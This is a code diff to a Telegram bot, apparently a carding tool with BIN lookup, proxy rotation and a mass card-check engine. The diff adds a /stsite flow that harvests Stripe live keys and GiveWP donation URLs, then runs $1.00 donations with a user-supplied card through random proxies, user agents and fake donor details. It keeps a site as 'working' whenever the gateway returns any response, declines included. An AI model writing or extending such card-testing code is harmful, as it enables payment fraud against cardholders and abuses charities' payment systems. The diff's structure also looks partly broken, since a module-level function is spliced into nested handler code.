@@ -38,6 +38,9 @@ BINS_CSV_FILE = 'bins_all.csv'
 MAX_RETRIES = 2
 PROXY_TIMEOUT = 5
 BIN_DB = {}
+# Temporary storage for /stsite file content
+pending_stsite = {}
+
 
 def load_bin_database():
     global BIN_DB
@@ -429,8 +432,8 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         except Exception as e:
             bot.send_message(call.message.chat.id, f"❌ Error: {e}")
 
-    # ============================================================================
-    # 📥 COMMAND: /stsite - Upload Stripe Donation Sites
+     # ============================================================================
+    # 📥 COMMAND: /stsite - Upload and test Stripe Donation Sites
     # ============================================================================
     @bot.message_handler(commands=['stsite'])
     def handle_stsite_command(message):
@@ -441,9 +444,9 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         bot.reply_to(
             message,
             "📤 **Send a .txt file** containing Stripe donation sites.\n"
-            "Format: `URL | pk_live_xxxx`\n"
+            "Each line can have extra text, as long as it contains a URL and a `pk_live_...` key.\n"
             "Example: `https://example.com/donate | pk_live_abc123`\n"
-            "One per line. The site will be added as GiveWP type.",
+            "I will extract them automatically.",
             parse_mode='Markdown'
         )
         bot.register_next_step_handler(message, process_stsite_file)
@@ -457,50 +460,187 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             file_info = bot.get_file(message.document.file_id)
             file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
 
-            added = 0
-            new_sites = []
+            candidates = []
             lines = file_content.split('\n')
-
-            donation_file = "donation_sites.json"
-            if os.path.exists(donation_file):
-                with open(donation_file, 'r') as f:
-                    sites = json.load(f)
-            else:
-                sites = []
-
             for line in lines:
                 line = line.strip()
                 if not line or line.startswith('#'):
                     continue
-                match = re.search(r'(https?://[^\s|]+)[\s|]+(pk_live_[a-zA-Z0-9]+)', line)
+                # Flexible regex: look for a URL and a pk_live string
+                match = re.search(r'(https?://[^\s|]+).*?(pk_live_[a-zA-Z0-9]+)', line, re.IGNORECASE)
                 if match:
                     url = match.group(1).rstrip('/')
                     pk = match.group(2)
-                    if not any(s['url'] == url for s in sites):
-                        sites.append({
-                            'url': url,
-                            'pk': pk,
-                            'type': 'givewp'
-                        })
-                        added += 1
-                        new_sites.append(f"{url} | {pk}")
+                    candidates.append({'url': url, 'pk': pk})
 
-            with open(donation_file, 'w') as f:
-                json.dump(sites, f, indent=2)
+            if not candidates:
+                bot.reply_to(message, "❌ No valid URL+PK pairs found in the file.")
+                return
 
-            report = f"✅ **Added {added} new donation sites.**\n\n"
-            if new_sites:
-                report += "**New sites:**\n" + "\n".join(new_sites[:10])
-                if len(new_sites) > 10:
-                    report += f"\n... and {len(new_sites)-10} more"
-            else:
-                report += "No new sites added (all duplicates or invalid format)."
+            # Store candidates temporarily
+            user_id = message.from_user.id
+            pending_stsite[user_id] = candidates
 
-            bot.reply_to(message, report, parse_mode='Markdown')
+            bot.reply_to(
+                message,
+                f"✅ Extracted **{len(candidates)}** potential sites.\n"
+                f"Now send me a **test card** (format: `CC|MM|YYYY|CVV`) to validate them.\n"
+                f"Example: `5154620020023386|10|2027|840`",
+                parse_mode='Markdown'
+            )
+            bot.register_next_step_handler(message, process_test_card)
 
         except Exception as e:
-            bot.reply_to(message, f"❌ Error: {str(e)}")
+            bot.reply_to(message, f"❌ Error reading file: {str(e)}")
 
+    def process_test_card(message):
+        user_id = message.from_user.id
+        if user_id not in pending_stsite:
+            bot.reply_to(message, "❌ No pending sites. Please start over with /stsite.")
+            return
+
+        test_cc = message.text.strip()
+        # Basic format check
+        if not re.match(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', test_cc):
+            bot.reply_to(message, "❌ Invalid card format. Use `CC|MM|YYYY|CVV`", parse_mode='Markdown')
+            return
+
+        candidates = pending_stsite[user_id]
+        total = len(candidates)
+        working = []
+        failed = []
+
+        status_msg = bot.reply_to(message, f"🔄 Testing {total} sites with your card... This may take a while.", parse_mode='HTML')
+
+        # Use a random proxy if available
+        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
+
+        for idx, site in enumerate(candidates, 1):
+            url = site['url']
+            pk = site['pk']
+            try:
+                # Update status every few sites
+                if idx % 5 == 0 or idx == total:
+                    bot.edit_message_text(
+                        f"🔄 Testing sites... {idx}/{total}\n"
+                        f"✅ Working: {len(working)}\n"
+                        f"❌ Failed: {len(failed)}",
+                        message.chat.id, status_msg.message_id
+                    )
+
+                # Test the site with the given card
+                if test_single_donation_site(url, pk, test_cc, proxy):
+                    working.append(site)
+                else:
+                    failed.append(url)
+            except Exception as e:
+                failed.append(f"{url} (error: {str(e)[:50]})")
+
+        # Save only working sites
+        donation_file = "donation_sites.json"
+        if os.path.exists(donation_file):
+            with open(donation_file, 'r') as f:
+                existing = json.load(f)
+        else:
+            existing = []
+
+        # Add new working sites (avoid duplicates)
+        added = 0
+        for site in working:
+            if not any(s['url'] == site['url'] for s in existing):
+                existing.append({
+                    'url': site['url'],
+                    'pk': site['pk'],
+                    'type': 'givewp'
+                })
+                added += 1
+
+        with open(donation_file, 'w') as f:
+            json.dump(existing, f, indent=2)
+
+        # Clean up pending data
+        del pending_stsite[user_id]
+
+        # Final report
+        report = (
+            f"✅ **Testing Complete**\n\n"
+            f"📊 Total candidates: {total}\n"
+            f"✅ Working: {len(working)}\n"
+            f"❌ Failed: {len(failed)}\n"
+            f"🆕 Added to database: {added}\n\n"
+        )
+        if failed:
+            report += "**Failed sites (first 10):**\n" + "\n".join(failed[:10])
+            if len(failed) > 10:
+                report += f"\n... and {len(failed)-10} more"
+
+        bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')
+
+# ----------------------------------------------------------------------------
+# Helper function to test a single donation site
+# ----------------------------------------------------------------------------
+def test_single_donation_site(url, pk, test_cc, proxy=None):
+    """
+    Attempt a full donation flow on a single site with a test card.
+    Returns True if the gateway responds (any result except an error).
+    """
+    try:
+        session = requests.Session()
+        if proxy:
+            formatted = gates.format_proxy(proxy)
+            if formatted:
+                session.proxies = formatted
+        ua = gates.get_random_ua()
+        session.headers.update({'User-Agent': ua})
+
+        # Load donation page
+        r = session.get(url, timeout=20)
+        if r.status_code != 200:
+            return False
+        html = r.text
+
+        # Extract GiveWP fields
+        form_id = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
+        form_hash = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
+        price_id = re.search(r'name="give-price-id"\s+value="([^"]+)"', html)
+
+        if not (form_id and form_hash and price_id):
+            # Try alternative patterns
+            form_id = re.search(r'name="give-form-id".*?value=["\']([^"\']+)', html, re.DOTALL)
+            form_hash = re.search(r'name="give-form-hash".*?value=["\']([^"\']+)', html, re.DOTALL)
+            price_id = re.search(r'name="give-price-id".*?value=["\']([^"\']+)', html, re.DOTALL)
+            if not (form_id and form_hash and price_id):
+                return False
+
+        # Create Stripe payment method
+        pm_id, err = gates.create_stripe_payment_method(session, test_cc, pk, ua)
+        if not pm_id:
+            return False
+
+        # Submit donation via AJAX
+        parsed = urlparse(url)
+        ajax_url = f"{parsed.scheme}://{parsed.netloc}/wp-admin/admin-ajax.php"
+        data = {
+            'give-form-id': form_id.group(1),
+            'give-form-hash': form_hash.group(1),
+            'give-price-id': price_id.group(1),
+            'give-amount': '1.00',
+            'give_first': 'Test',
+            'give_last': 'User',
+            'give_email': f'test{uuid.uuid4().hex[:8]}@gmail.com',
+            'give-gateway': 'stripe',
+            'action': 'give_process_donation',
+            'give_ajax': 'true',
+        }
+        r2 = session.post(ajax_url, data=data, timeout=20)
+        response_text = r2.text.lower()
+
+        # If we get any gateway response (even decline), the site is usable
+        if any(word in response_text for word in ['success', 'insufficient_funds', 'incorrect_cvc', 'do_not_honor', 'generic_decline']):
+            return True
+        return False
+    except Exception:
+        return False
     # ============================================================================
     # 🧠 MASS CHECK ENGINE
     # ============================================================================
@@ -698,4 +838,5 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 <b>Total:</b> {total} | <b>Time:</b> {duration:.2f}s
 """
         try: bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
+
         except: bot.send_message(chat_id, msg, parse_mode='HTML')
